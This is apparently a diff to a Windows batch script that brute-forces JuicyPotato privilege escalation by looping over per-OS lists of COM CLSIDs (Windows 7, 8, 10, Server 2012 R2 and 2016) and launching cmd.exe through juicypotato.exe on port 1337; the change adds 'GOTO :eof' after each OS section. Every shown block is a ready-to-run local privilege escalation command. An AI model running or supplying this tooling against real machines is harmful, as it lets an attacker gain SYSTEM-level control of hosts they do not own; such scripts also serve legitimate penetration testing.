@@ -36,6 +36,7 @@ for %%w in (
 {F087771F-D74F-4C1A-BB8A-E16ACA9124EA}
 ) do .\juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c %%w
 echo "Fuzz Completed: "
+GOTO :eof
 
 :WS2012R2
 for %%x in (
@@ -76,6 +77,7 @@ for %%x in (
 {90F18417-F0F1-484E-9D3C-59DCEEE5DBD8}
 ) do .\juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c %%x
 echo "Fuzz Completed: "
+GOTO :eof
 
 :WS2016
 for %%y in (
@@ -128,7 +130,7 @@ for %%y in (
 {c980e4c2-c178-4572-935d-a8a429884806}
 ) do .\juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c %%y
 echo "Fuzz Completed: "
-
+GOTO :eof
 
 :W7
 for %%y in (
@@ -141,6 +143,7 @@ for %%y in (
 {659cdea7-489e-11d9-a9cd-000d56965251}
 ) do .\juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c %%y
 echo "Fuzz Completed: "
+GOTO :eof
 
 :W8
 for %%z in (
@@ -191,6 +194,7 @@ for %%z in (
 {9c212ed3-cfd2-4676-92d8-3fbb2c3a8379}
 ) do .\juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c %%z
 echo "Fuzz Completed: "
+GOTO :eof
 
 :W10ent
 for %%a in (
@@ -255,6 +259,7 @@ for %%a in (
 {c980e4c2-c178-4572-935d-a8a429884806}
 ) do .\juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c %%a
 echo "Fuzz Completed: "
+GOTO :eof
 
 :W10pro
 for %%b in (
@@ -302,3 +307,4 @@ for %%b in (
 {90F18417-F0F1-484E-9D3C-59DCEEE5DBD8}
 ) do .\juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c %%b
 echo "Fuzz Completed: "
+GOTO :eof
